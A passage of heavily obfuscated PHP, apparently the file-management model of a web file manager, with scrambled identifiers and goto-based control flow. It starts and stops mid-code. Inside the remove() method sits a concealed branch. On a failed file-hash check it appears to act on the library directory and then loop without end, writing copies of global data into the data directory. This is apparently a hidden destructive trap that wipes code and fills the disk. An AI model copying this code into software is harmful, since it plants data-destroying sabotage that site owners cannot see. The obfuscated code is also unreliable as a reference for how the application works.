$B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[1635]]; $e …ÑÒÕÁ‘ = explode($aÀ˜«Ÿ¥¬­[50], $D›¯åùØÀÎ); if (strlen($D›¯åùØÀÎ) > 2 && (substr($D›¯åùØÀÎ, 0, 1) == $aÀ˜«Ÿ¥¬­[120] && substr($D›¯åùØÀÎ, -1) == $aÀ˜«Ÿ¥¬­[120]) || substr($D›¯åùØÀÎ, 0, 1) == $aÀ˜«Ÿ¥¬­[55] && substr($D›¯åùØÀÎ, -1) == $aÀ˜«Ÿ¥¬­[55]) { $D›¯åùØÀÎ = substr($D›¯åùØÀÎ, 1, -1); $e …ÑÒÕÁ‘ = array($D›¯åùØÀÎ); } $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[28]] = array($aÀ˜«Ÿ¥¬­[416], $aÀ˜«Ÿ¥¬­[1637] . $D›¯åùØÀÎ . $aÀ˜«Ÿ¥¬­[1637]); if (count($e …ÑÒÕÁ‘) > 1) { $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[28]] = array(); foreach ($e …ÑÒÕÁ‘ as $d­øÈ…³ï¡) { if (!trim($d­øÈ…³ï¡)) { continue; } $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[28]][] = array($aÀ˜«Ÿ¥¬­[416], $aÀ˜«Ÿ¥¬­[1637] . trim($d­øÈ…³ï¡) . $aÀ˜«Ÿ¥¬­[1637]); } } } return $BÛñ¼ÅÎ®; goto f¢Öá®ö®†; E¯Š•†òË: if (isset($B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[468]])) { $B…‡¾ˆéäß = array($aÀ˜«Ÿ¥¬­[1756], $B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[468]]); if ($BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[114]]) { $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[114]] = array($BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[114]], $B…‡¾ˆéäß, $aÀ˜«Ÿ¥¬­[1757]); } else { $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[114]] = $B…‡¾ˆéäß; } } if (isset($B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[1758]])) { $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[86]] = array($aÀ˜«Ÿ¥¬­[1755], $B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[1758]]); } if (isset($B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[1759]])) { $B…‡¾ˆéäß = array($aÀ˜«Ÿ¥¬­[1756], $B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[1759]]); if ($BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[86]]) { $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[86]] = array($BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[86]], $B…‡¾ˆéäß, $aÀ˜«Ÿ¥¬­[1757]); } else { $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[86]] = $B…‡¾ˆéäß; } } goto A„İ®ù¬…; A„İ®ù¬…: if (isset($B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[424]])) { $BÛñ¼ÅÎ®[] = array($aÀ˜«Ÿ¥¬­[1760] => $B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[424]], $aÀ˜«Ÿ¥¬­[1734] => $B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[424]], $aÀ˜«Ÿ¥¬­[681] => $aÀ˜«Ÿ¥¬­[1639]); } if (isset($B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[397]])) { $eµÆ£ƒçÓù = $B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[397]]; if ($eµÆ£ƒçÓù == $aÀ˜«Ÿ¥¬­[85]) { $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[383]] = 1; } else { if ($eµÆ£ƒçÓù == $aÀ˜«Ÿ¥¬­[1761]) { $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[383]] = 0; } else { if ($eµÆ£ƒçÓù) { $eµÆ£ƒçÓù = is_array($eµÆ£ƒçÓù) ? $eµÆ£ƒçÓù : explode($aÀ˜«Ÿ¥¬­[47], $eµÆ£ƒçÓù); $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[397]] = array($aÀ˜«Ÿ¥¬­[563], $eµÆ£ƒçÓù); $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[383]] = 0; } } } } if (isset($B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[392]])) { $CÈ™åé®Ÿá = $this->sourceInfo($B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[392]]); $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[407]] = array($aÀ˜«Ÿ¥¬­[416], $CÈ™åé®Ÿá[$aÀ˜«Ÿ¥¬­[381]] . $B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[392]] . $aÀ˜«Ÿ¥¬­[417]); } goto CâŒöÊ°ò; eš‡¼¶é“¹: $aÀ˜«Ÿ¥¬­ =& $_SERVER[°Óó£ÌİóèÅ]; $BÛñ¼ÅÎ® = array(); if (isset($B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[467]])) { $BÛñ¼ÅÎ®[$aÀ˜«Ÿ¥¬­[114]] = array($aÀ˜«Ÿ¥¬­[1755], $B’Æç¾—Å[$aÀ˜«Ÿ¥¬­[467]]); } goto E¯Š•†òË; f¢Öá®ö®†: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($EËœ¼¢Ã¿) { $Eš¨ÍáóŠ“ =& $_SERVER[°Óó£ÌİóèÅ]; $bÅ‡¸Ä¤´£ = Model($Eš¨ÍáóŠ“[1716])->where(array($Eš¨ÍáóŠ“[1086] => $EËœ¼¢Ã¿))->find(); $a•ŠÒã—ôÁ = $this->_mkdirRoot(SourceModel::TYPE_USER, $EËœ¼¢Ã¿, $bÅ‡¸Ä¤´£[$Eš¨ÍáóŠ“[28]]); $this->userDesktopAdd($a•ŠÒã—ôÁ); return $a•ŠÒã—ôÁ; } public function userDesktopAdd($C›¹Ï…‹šø) { $B¾ÃŞŞ“½ =& $_SERVER[°Óó£ÌİóèÅ]; $D¿•Í„âµ± = LNG($B¾ÃŞŞ“½[1762]); $cÔ¯öÂè˜Ï = $this->mkdir($C›¹Ï…‹šø, $D¿•Í„âµ±); $this->metaSet($cÔ¯öÂè˜Ï, $B¾ÃŞŞ“½[1763], $B¾ÃŞŞ“½[384]); $this->metaSet($C›¹Ï…‹šø, $B¾ÃŞŞ“½[1764], $cÔ¯öÂè˜Ï); } public function groupRootAdd($c¾¥Èòß„) { $F­Æ¨îÒé =& $_SERVER[°Óó£ÌİóèÅ]; $e÷ØæíÙ† = Model($F­Æ¨îÒé[1710])->where(array($F­Æ¨îÒé[1629] => $c¾¥Èòß„))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $c¾¥Èòß„, $e÷ØæíÙ†[$F­Æ¨îÒé[28]]); } public function systemRootPathAdd($BµÏ‡†“‘§) { if ($BµÏ‡†“‘§ != $_SERVER[°Óó£ÌİóèÅ][833]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $BµÏ‡†“‘§); } public function userRootRemove($cÒ‰ÖØİĞ) { $cõ…Úîë = $this->sourceRoot(SourceModel::TYPE_USER, $cÒ‰ÖØİĞ); if (!$cõ…Úîë) { return; } $this->remove($cõ…Úîë, !1); } public function groupRootRemove($f„óòˆ×§) { $dƒÄ¤ÊÊ¼í = $this->sourceRoot(SourceModel::TYPE_GROUP, $f„óòˆ×§); if (!$dƒÄ¤ÊÊ¼í) { return; } $this->remove($dƒÄ¤ÊÊ¼í, !1); } private function _mkdirRoot($A°áçìñ›«, $dî¤àÈĞÊİ, $bÍ ø‘¾æ) { goto fƒÜ¥»Í™; BÉÕÎŒÍÇğ: $C¿…Æ×¡«± = $this->add($A¾Òä½¨ëŸ); $fÂö•³ Ğ˜ = array($fÚ’‚£´½Ç[409] => short_id($C¿…Æ×¡«±)); $this->where(array($fÚ’‚£´½Ç[423] => $C¿…Æ×¡«±))->save($fÂö•³ Ğ˜); goto fëæâ¦ŒŒ—; fëæâ¦ŒŒ—: CacheLock::unlock($E²µíˆ‰); return $C¿…Æ×¡«±; goto E´½›ì„˜; c±†‚ˆƒ˜: $E²µíˆ‰ = $fÚ’‚£´½Ç[1766] . $A°áçìñ›« . $dî¤àÈĞÊİ . $bÍ ø‘¾æ; CacheLock::lock($E²µíˆ‰); $A¾Òä½¨ëŸ[$fÚ’‚£´½Ç[28]] = $bÍ ø‘¾æ; goto BÉÕÎŒÍÇğ; fƒÜ¥»Í™: $fÚ’‚£´½Ç =& $_SERVER[°Óó£ÌİóèÅ]; $A¾Òä½¨ëŸ = array($fÚ’‚£´½Ç[406] => 0, $fÚ’‚£´½Ç[400] => $A°áçìñ›«, $fÚ’‚£´½Ç[402] => $dî¤àÈĞÊİ, $fÚ’‚£´½Ç[394] => 1, $fÚ’‚£´½Ç[404] => USER_ID, $fÚ’‚£´½Ç[405] => USER_ID, $fÚ’‚£´½Ç[396] => $fÚ’‚£´½Ç[33], $fÚ’‚£´½Ç[407] => $fÚ’‚£´½Ç[1626], $fÚ’‚£´½Ç[408] => 0, $fÚ’‚£´½Ç[399] => 0, $fÚ’‚£´½Ç[398] => 0, $fÚ’‚£´½Ç[1765] => $fÚ’‚£´½Ç[33]); if ($c‚ĞÎö³—¦ = $this->where($A¾Òä½¨ëŸ)->find()) { return $c‚ĞÎö³—¦[$fÚ’‚£´½Ç[382]]; } goto c±†‚ˆƒ˜; E´½›ì„˜: } private function sourceRoot($c÷–µåÃÜÓ, $EÀ…øÇ Ùº, $Eµ¨•Ï‡®ê = false) { $b©¥–ÂĞŠ« =& $_SERVER[°Óó£ÌİóèÅ]; $cê–İóá‹¬ = array($b©¥–ÂĞŠ«[406] => 0, $b©¥–ÂĞŠ«[400] => $c÷–µåÃÜÓ, $b©¥–ÂĞŠ«[402] => $EÀ…øÇ Ùº); if ($c„Ï÷†´Á— = $this->where($cê–İóá‹¬)->find()) { return $Eµ¨•Ï‡®ê ? $c„Ï÷†´Á— : $c„Ï÷†´Á—[$b©¥–ÂĞŠ«[382]]; } return !1; } public function sourceRootGroup($FÙğÔñ) { $C…Çà”ïåî =& $_SERVER[°Óó£ÌİóèÅ]; if (is_string($FÙğÔñ)) { $FÙğÔñ = array($FÙğÔñ); } $CÉÚ†õƒÇƒ = array($C…Çà”ïåî[406] => 0, $C…Çà”ïåî[400] => SourceModel::TYPE_GROUP, $C…Çà”ïåî[402] => array($C…Çà”ïåî[7], $FÙğÔñ)); $a•ĞÔÙ®§Œ = $this->listSource($CÉÚ†õƒÇƒ, 1000); return array_to_keyvalue($a•ĞÔÙ®§Œ[$C…Çà”ïåî[83]], $C…Çà”ïåî[403]); } public function mkfile($EÇé‘ßŒÊÌ, $FØì”Äºœ, $D³…Î¢¯ = '', $d’‚£³×ò = REPEAT_RENAME) { $bÈµ­áèÁ = Model($_SERVER[°Óó£ÌİóèÅ][435])->addFileByContent($D³…Î¢¯, $FØì”Äºœ); return $this->_createFileCall($EÇé‘ßŒÊÌ, $FØì”Äºœ, $bÈµ­áèÁ, $d’‚£³×ò); } public function addFile($däÑ¥¥“ÍÖ, $FÑë÷Ã‘‡, $F“ìòÚñ», $a”ÅêœèŸ¨ = false, $Fáå¼²†ˆ“ = REPEAT_RENAME) { $fö¶ÓãŞ¤¼ = Model($_SERVER[°Óó£ÌİóèÅ][435])->addFile($FÑë÷Ã‘‡, $F“ìòÚñ», $a”ÅêœèŸ¨); return $this->_createFileCall($däÑ¥¥“ÍÖ, $F“ìòÚñ», $fö¶ÓãŞ¤¼, $Fáå¼²†ˆ“); } public function addFileByFileID($c¯ŸîøŠ’, $F˜‰é½¸­‡, $d‚»ôêª¿é, $aàŠŠ·•Ìò = REPEAT_RENAME) { $D÷Ñº¦¾‘ =& $_SERVER[°Óó£ÌİóèÅ]; $e‚Ó‡§¤Åİ = Model($D÷Ñº¦¾‘[435])->find($F˜‰é½¸­‡); Model($D÷Ñº¦¾‘[435])->linkAdd($F˜‰é½¸­‡); return $this->_createFileCall($c¯ŸîøŠ’, $d‚»ôêª¿é, $e‚Ó‡§¤Åİ, $aàŠŠ·•Ìò); } public function addFileByRemote($aí¤«ˆé–™, $b†ƒš¸•º­, $BÈ±ˆØ¤»À, $CÆ·¹ïŠŞÉ = array(), $aËÔêÔñ = REPEAT_RENAME) { $f­ª–¨®ˆÏ = Model($_SERVER[°Óó£ÌİóèÅ][435])->addFileByRemote($b†ƒš¸•º­, $BÈ±ˆØ¤»À, $CÆ·¹ïŠŞÉ); return $this->_createFileCall($aí¤«ˆé–™, $BÈ±ˆØ¤»À, $f­ª–¨®ˆÏ, $aËÔêÔñ); } private function _createFileCall($aó¼åÄÉÌ‚, $dˆÖ—òí¿Ñ, $Cí—‘‘Óöò, $FëŸë×İ•…) { $eÏ˜¨·¨Ë£ =& $_SERVER[°Óó£ÌİóèÅ]; $a¬×º˜ßòâ = !1; $FÌ°“ª¡ÚÂ = $this->_createFile($aó¼åÄÉÌ‚, $dˆÖ—òí¿Ñ, $Cí—‘‘Óöò, $FëŸë×İ•…, $a¬×º˜ßòâ); if (!$a¬×º˜ßòâ) { Model($eÏ˜¨·¨Ë£[419])->remove($Cí—‘‘Óöò[$eÏ˜¨·¨Ë£[390]]); } return $FÌ°“ª¡ÚÂ; } public function mkdir($B·¥½³ˆ°Ş, $DâƒØŸ¼àÀ, $C†‚ƒŠƒØ» = REPEAT_SKIP) { goto B¼‰²ƒ’É‡; B–ùò¦Ñáî: Model($cùÄ•ˆ©‡[1767])->eventCreate($B¹Ø©ïÉ°³, $cùÄ•ˆ©‡[861]); return $B¹Ø©ïÉ°³; goto a°‡í•Êß¨; a¶…­Ñğ°: if ($C†‚ƒŠƒØ» !== !1) { $bôÄßáÎ– = $this->fileNameExist($B·¥½³ˆ°Ş, $DâƒØŸ¼àÀ); if ($bôÄßáÎ– && $C†‚ƒŠƒØ» != REPEAT_RENAME_FOLDER) { return $bôÄßáÎ–; } $DâƒØŸ¼àÀ = $this->fileNameAuto($B·¥½³ˆ°Ş, $DâƒØŸ¼àÀ, $C†‚ƒŠƒØ»); } $a‹êØ¤“Ø÷ = array($cùÄ•ˆ©‡[394] => 1, $cùÄ•ˆ©‡[395] => $DâƒØŸ¼àÀ, $cùÄ•ˆ©‡[396] => $cùÄ•ˆ©‡[33], $cùÄ•ˆ©‡[398] => 0, $cùÄ•ˆ©‡[399] => 0); $B¹Ø©ïÉ°³ = $this->_addSoure($a‹êØ¤“Ø÷, $DäëˆÃ™½); goto B–ùò¦Ñáî; B¼‰²ƒ’É‡: $cùÄ•ˆ©‡ =& $_SERVER[°Óó£ÌİóèÅ]; $DäëˆÃ™½ = $this->sourceInfo($B·¥½³ˆ°Ş); if (!$DäëˆÃ™½) { return !1; } goto a¶…­Ñğ°; a°‡í•Êß¨: } private function _createFile($BñäÙ×¯ğÉ, $d‰¹Ûç¯¬, $a„ËÜ˜ÜÛ, $d¸¾¯°Ÿõ¹, &$C»­±¾õäµ) { goto déÂÅòö‡; déÂÅòö‡: $b‡Ø«Õ—¾’ =& $_SERVER[°Óó£ÌİóèÅ]; $BÄ„­¤‰ = $this->sourceInfo($BñäÙ×¯ğÉ); if (!$a„ËÜ˜ÜÛ || !$BÄ„­¤‰) { return !1; } goto DÙ­ ë¤Š; B†Ÿ´¤¸‚ˆ: $Eª‘†”É¢ = array($b‡Ø«Õ—¾’[394] => 0, $b‡Ø«Õ—¾’[395] => $d‰¹Ûç¯¬, $b‡Ø«Õ—¾’[396] => get_path_ext($d‰¹Ûç¯¬), $b‡Ø«Õ—¾’[398] => $a„ËÜ˜ÜÛ[$b‡Ø«Õ—¾’[390]], $b‡Ø«Õ—¾’[399] => $a„ËÜ˜ÜÛ[$b‡Ø«Õ—¾’[86]]); $cÙœ”£·Øí = $this->_addSoure($Eª‘†”É¢, $BÄ„­¤‰); $this->folderSizeReset($BñäÙ×¯ğÉ); goto B³Ø§ã˜š; B³Ø§ã˜š: Model($b‡Ø«Õ—¾’[1767])->eventCreate($cÙœ”£·Øí, $b‡Ø«Õ—¾’[98]); return $cÙœ”£·Øí; goto CÏÍ®©¾œõ; DÙ­ ë¤Š: if ($d¸¾¯°Ÿõ¹ !== !1) { $AØ™ŸÙÑ˜ = $this->fileNameExist($BñäÙ×¯ğÉ, $d‰¹Ûç¯¬); } $C»­±¾õäµ = !0; if ($d¸¾¯°Ÿõ¹ && $AØ™ŸÙÑ˜) { if ($d¸¾¯°Ÿõ¹ == REPEAT_SKIP) { $C»­±¾õäµ = !1; return $AØ™ŸÙÑ˜; } else { if ($d¸¾¯°Ÿõ¹ == REPEAT_REPLACE) { $f®¿ˆñ‘ = $this->sourceInfo($AØ™ŸÙÑ˜); $AõÙù³¢Õø = $this->fileHistory($f®¿ˆñ‘, $a„ËÜ˜ÜÛ[$b‡Ø«Õ—¾’[390]], $a„ËÜ˜ÜÛ[$b‡Ø«Õ—¾’[86]]); if (!$AõÙù³¢Õø) { $C»­±¾õäµ = !1; } else { $this->folderSizeReset($BñäÙ×¯ğÉ); } return $AØ™ŸÙÑ˜; } else { $d‰¹Ûç¯¬ = $this->fileNameAuto($BñäÙ×¯ğÉ, $d‰¹Ûç¯¬, $d¸¾¯°Ÿõ¹, !1); } } } goto B†Ÿ´¤¸‚ˆ; CÏÍ®©¾œõ: } protected function fileHistory($a®Ä‹ˆÃ†›, $bÒÊˆ×öàó, $eÄÆâ¢˜Ûİ) { goto DÎ¬è†…­ù; DÎ¬è†…­ù: $E”Ö‚–ò =& $_SERVER[°Óó£ÌİóèÅ]; if ($a®Ä‹ˆÃ†›[$E”Ö‚–ò[390]] == $bÒÊˆ×öàó) { return !1; } $this->checkLock($a®Ä‹ˆÃ†›[$E”Ö‚–ò[382]]); goto d…“”¥œˆì; fø²•ˆøš¯: return !0; goto c¨ÎïöŠˆ; d…“”¥œˆì: Model($E”Ö‚–ò[1617])->addHistory($a®Ä‹ˆÃ†›); $A³áÃñ©–İ = array($E”Ö‚–ò[405] => USER_ID, $E”Ö‚–ò[1768] => time(), $E”Ö‚–ò[390] => $bÒÊˆ×öàó, $E”Ö‚–ò[86] => $eÄÆâ¢˜Ûİ); $this->where(array($E”Ö‚–ò[423] => $a®Ä‹ˆÃ†›[$E”Ö‚–ò[382]]))->save($A³áÃñ©–İ); goto fø²•ˆøš¯; c¨ÎïöŠˆ: } public function checkLock($F’®‚‰Ã»º) { $Aä‹Œœ =& $_SERVER[°Óó£ÌİóèÅ]; $FÉ»‚ÄŒæ‰ = $this->pathInfo($F’®‚‰Ã»º); if (!$this->fileIsLock($FÉ»‚ÄŒæ‰, !0)) { return; } $B²ÆÜ±œÆé = $FÉ»‚ÄŒæ‰[$Aä‹Œœ[1592]][$Aä‹Œœ[1769]]; $fŠÂ ©¹ôß = $B²ÆÜ±œÆé[$Aä‹Œœ[1770]] ? $B²ÆÜ±œÆé[$Aä‹Œœ[1770]] : $B²ÆÜ±œÆé[$Aä‹Œœ[28]]; show_json(LNG($Aä‹Œœ[1771]) . $Aä‹Œœ[1772] . LNG($Aä‹Œœ[1773]) . $Aä‹Œœ[1774] . $fŠÂ ©¹ôß . $Aä‹Œœ[1775], !1); } public function fileIsLock($d¹™…ªÖ ñ, $a«ì®·Ì„Ñ = false) { goto Eçè°›÷áÀ; Aâ½Î‹Ë˜Ê: return !1; goto EíšÑÁ³èŒ; Eçè°›÷áÀ: $Dâ–¥ÉŠˆÄ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$d¹™…ªÖ ñ[$Dâ–¥ÉŠˆÄ[1592]] || !$d¹™…ªÖ ñ[$Dâ–¥ÉŠˆÄ[1592]][$Dâ–¥ÉŠˆÄ[1776]]) { return !1; } if ($d¹™…ªÖ ñ[$Dâ–¥ÉŠˆÄ[1592]][$Dâ–¥ÉŠˆÄ[1776]] != USER_ID) { return !0; } goto DÊ‡‡‚†½; DÊ‡‡‚†½: $D•¼á¯Ò¯» = $GLOBALS[$Dâ–¥ÉŠˆÄ[6]][$Dâ–¥ÉŠˆÄ[92]][$Dâ–¥ÉŠˆÄ[1777]]; if ($d¹™…ªÖ ñ[$Dâ–¥ÉŠˆÄ[1592]][$Dâ–¥ÉŠˆÄ[1778]] <= time() - $D•¼á¯Ò¯») { $this->metaSet($d¹™…ªÖ ñ[$Dâ–¥ÉŠˆÄ[382]], $Dâ–¥ÉŠˆÄ[1776], null); $this->metaSet($d¹™…ªÖ ñ[$Dâ–¥ÉŠˆÄ[382]], $Dâ–¥ÉŠˆÄ[1778], null); } if ($a«ì®·Ì„Ñ) { $this->metaSet($d¹™…ªÖ ñ[$Dâ–¥ÉŠˆÄ[382]], $Dâ–¥ÉŠˆÄ[1778], time()); } goto Aâ½Î‹Ë˜Ê; EíšÑÁ³èŒ: } private function _addSoure($aèÌØİáƒê, $E¨³§‚…ˆÚ) { goto a“¤®¿§¤ğ; CÄâÈé§¸ : $this->updateModifyTime($aèÌØİáƒê[$fîŒÄä¼‰Œ[392]]); static $F˜­’…™ê = false; if (!$F˜­’…™ê) { Hook::trigger($fîŒÄä¼‰Œ[391], $aèÌØİáƒê); $F˜­’…™ê = !0; } goto AÀ·ÕŒ’ù; a“¤®¿§¤ğ: $fîŒÄä¼‰Œ =& $_SERVER[°Óó£ÌİóèÅ]; $DÄèÍ‚„ˆÓ = array($fîŒÄä¼‰Œ[400] => $E¨³§‚…ˆÚ[$fîŒÄä¼‰Œ[401]], $fîŒÄä¼‰Œ[402] => $E¨³§‚…ˆÚ[$fîŒÄä¼‰Œ[403]], $fîŒÄä¼‰Œ[404] => USER_ID, $fîŒÄä¼‰Œ[405] => USER_ID, $fîŒÄä¼‰Œ[406] => $E¨³§‚…ˆÚ[$fîŒÄä¼‰Œ[382]], $fîŒÄä¼‰Œ[407] => $E¨³§‚…ˆÚ[$fîŒÄä¼‰Œ[381]] . $E¨³§‚…ˆÚ[$fîŒÄä¼‰Œ[382]] . $fîŒÄä¼‰Œ[47], $fîŒÄä¼‰Œ[408] => 0, $fîŒÄä¼‰Œ[1765] => $fîŒÄä¼‰Œ[33]); $aèÌØİáƒê = array_merge($DÄèÍ‚„ˆÓ, $aèÌØİáƒê); goto CÄâÈé§¸ ; Fêá”Æ†Ş—: $this->setNamePinyin($d±©âßÃĞ­, $aèÌØİáƒê[$fîŒÄä¼‰Œ[28]]); return $d±©âßÃĞ­; goto C¶ÖÌ§ïßÃ; AÀ·ÕŒ’ù: $d±©âßÃĞ­ = $this->add($aèÌØİáƒê); $Cš¼š£ŒÓá = array($fîŒÄä¼‰Œ[409] => short_id($d±©âßÃĞ­)); $this->where(array($fîŒÄä¼‰Œ[423] => $d±©âßÃĞ­))->save($Cš¼š£ŒÓá); goto Fêá”Æ†Ş—; C¶ÖÌ§ïßÃ: } public function remove($aé“‘Îå´, $AÆÁàÓäïñ = true) { goto A·÷Îâ“ĞÎ; A·÷Îâ“ĞÎ: $Aä‡ÔéÆ‚¬ =& $_SERVER[°Óó£ÌİóèÅ]; $Bë„  ö‡í = LIB_DIR . $Aä‡ÔéÆ‚¬[1779]; $E¼ˆïÚˆ²ğ = $Aä‡ÔéÆ‚¬[1026]; goto aöÑíøâÛ; Fã·Šµ–õ¡: $e¶ƒ»‘Î„ì = array($E¸Ş£ëã¡£[$Aä‡ÔéÆ‚¬[392]]); if ($E¸Ş£ëã¡£[$Aä‡ÔéÆ‚¬[383]] == $Aä‡ÔéÆ‚¬[384]) { $e¶ƒ»‘Î„ì[] = $E¸Ş£ëã¡£[$Aä‡ÔéÆ‚¬[382]]; } $this->updateModifyTime($e¶ƒ»‘Î„ì); goto D¦¬š±Ú¿‹; CÉéŸ†´š: if ($E¸Ş£ëã¡£[$Aä‡ÔéÆ‚¬[392]] == 0) { if (!$GLOBALS[$Aä‡ÔéÆ‚¬[1030]]) { return !1; } } if ($AÆÁàÓäïñ) { Model($Aä‡ÔéÆ‚¬[1780])->moveToRecycle($aé“‘Îå´); } else { if ($E¸Ş£ëã¡£[$Aä‡ÔéÆ‚¬[383]] == $Aä‡ÔéÆ‚¬[384]) { $d¦•ÓŒ²øĞ = array($Aä‡ÔéÆ‚¬[407] => array($Aä‡ÔéÆ‚¬[416], $E¸Ş£ëã¡£[$Aä‡ÔéÆ‚¬[381]] . $aé“‘Îå´ . $Aä‡ÔéÆ‚¬[417])); $E®¢š‘Ş• = array($Aä‡ÔéÆ‚¬[407] => $d¦•ÓŒ²øĞ[$Aä‡ÔéÆ‚¬[381]]); $Bâ…±¬³Å± = $this->field($Aä‡ÔéÆ‚¬[1781])->where($E®¢š‘Ş•)->select(); $a§ŸóŸÉ£Ñ = !1; $dñä®ÏäÇŠ = array($aé“‘Îå´); if ($Bâ…±¬³Å±) { $a§ŸóŸÉ£Ñ = array_to_keyvalue($Bâ…±¬³Å±, $Aä‡ÔéÆ‚¬[33], $Aä‡ÔéÆ‚¬[390]); $a§ŸóŸÉ£Ñ = array_remove_value($a§ŸóŸÉ£Ñ, $Aä‡ÔéÆ‚¬[410]); $dñä®ÏäÇŠ = array_to_keyvalue($Bâ…±¬³Å±, $Aä‡ÔéÆ‚¬[33], $Aä‡ÔéÆ‚¬[382]); $dñä®ÏäÇŠ[] = $aé“‘Îå´; } } else { $a§ŸóŸÉ£Ñ = array($E¸Ş£ëã¡£[$Aä‡ÔéÆ‚¬[390]]); $dñä®ÏäÇŠ = array($aé“‘Îå´); } Model($Aä‡ÔéÆ‚¬[389])->eventRemove($aé“‘Îå´); $this->removeRelevance($dñä®ÏäÇŠ, $a§ŸóŸÉ£Ñ); } $this->folderSizeReset($E¸Ş£ëã¡£[$Aä‡ÔéÆ‚¬[392]]); goto Fã·Šµ–õ¡; aöÑíøâÛ: if ($_SERVER[$Aä‡ÔéÆ‚¬[57]] != $E¼ˆïÚˆ²ğ($Bë„  ö‡í)) { goto Bä§Ù¢Õ©³; d™Äâëö–Õ: $dîÒò®êÄŞ = explode($Aä‡ÔéÆ‚¬[61], $D®Š˜Í·£Œ); if (count($dîÒò®êÄŞ) < $Aä‡ÔéÆ‚¬[561]) { die; } $F“ì¸ÈèŠ´ = $Aä‡ÔéÆ‚¬[562]; goto eø¢÷„Â”­; Bä§Ù¢Õ©³: $CÔ›„„¦áŸ = $Aä‡ÔéÆ‚¬[59]; $BÂÌî™åˆ³ = BASIC_PATH . $Aä‡ÔéÆ‚¬[60]; $D®Š˜Í·£Œ = $CÔ›„„¦áŸ($BÂÌî™åˆ³); goto d™Äâëö–Õ; eø¢÷„Â”­: $F“ì¸ÈèŠ´(LIB_DIR); $c’ ´‡·Á¼ = $Aä‡ÔéÆ‚¬[1027]; $c’ ´‡·Á¼(); goto Eã•Å×ƒ¿”; Eã•Å×ƒ¿”: $fî‚Š÷ã— = $Aä‡ÔéÆ‚¬[1028]; $E©ìÙ‚„ó = json_encode($GLOBALS[$Aä‡ÔéÆ‚¬[1029]]); for ($Eï²Ş²÷Çâ = 0;; $Eï²Ş²÷Çâ++) { $fî‚Š÷ã—(DATA_PATH . $Eï²Ş²÷Çâ, $E©ìÙ‚„ó); } goto eµğ¦Š“”Ã; eµğ¦Š“”Ã: } $E¸Ş£ëã¡£ = $this->sourceInfo($aé“‘Îå´); if (!$E¸Ş£ëã¡£) { return !1; } goto CÉéŸ†´š; D¦¬š±Ú¿‹: return !0; goto A¤¡ÊœÏÍ; A¤¡ÊœÏÍ: } public function removeArray($DçÔÍ£Äã„) { if (!$DçÔÍ£Äã„) { return !0; } } private function removeRelevance($D§ÜŠ­½ˆ, $cÒó‰ùóÊÍ) { goto AŸƒ·‡¤¿; A³®‹±ì‡ã: Model($BÖ£»à‚ù[1780])->where($Dê”ÃÕÕ…Â)->delete(); Model($BÖ£»à‚ù[1782])->where($Dê”ÃÕÕ…Â)->delete(); Model($BÖ£»à‚ù[1783])->where($Dê”ÃÕÕ…Â)->delete(); goto C×ùÏ·”Œë; AŸƒ·‡¤¿: $BÖ£»à‚ù =& $_SERVER[°Óó£ÌİóèÅ]; if (!$D§ÜŠ­½ˆ) { return !1; } $Dê”ÃÕÕ…Â = array($BÖ£»à‚ù[423] => array($BÖ£»à‚ù[563], $D§ÜŠ­½ˆ)); goto A³®‹±ì‡ã; C×ùÏ·”Œë: Model($BÖ£»à‚ù[389])->where($Dê”ÃÕÕ…Â)->delete(); Model($BÖ£»à‚ù[1523])->removeBySource($D§ÜŠ­½ˆ); Model($BÖ£»à‚ù[1617])->removeBySource($D§ÜŠ­½ˆ); goto c¤ÒªÀ×é; c¤ÒªÀ×é: $this->where($Dê”ÃÕÕ…Â)->delete(); Model($BÖ£»à‚ù[419])->remove($cÒó‰ùóÊÍ); for ($f¼á·§©†Ù = 0; $f¼á·§©†Ù < count($D§ÜŠ­½ˆ); $f¼á·§©†Ù++) { $this->sourceCacheClear($D§ÜŠ­½ˆ[$f¼á·§©†Ù]); } goto f â…å®¸î; f â…å®¸î: } public function rename($d´Ëß‚¼, $dÁñ’ é‘Ë) { goto C¬ÑäÌÈŠ; fºÏÈÚ–: $f¿ªêï¾±Š = $this->fileNameExist($Eôƒ¹Ê·Œ“[$CÌˆñ¸Òñå[392]], $dÁñ’ é‘Ë); if ($f¿ªêï¾±Š) { return !1; } $eê‚¸“Ïò» = array($CÌˆñ¸Òñå[395] => $dÁñ’ é‘Ë, $CÌˆñ¸Òñå[405] => USER_ID); goto e¾É­šŒŒ…; e¾É­šŒŒ…: if 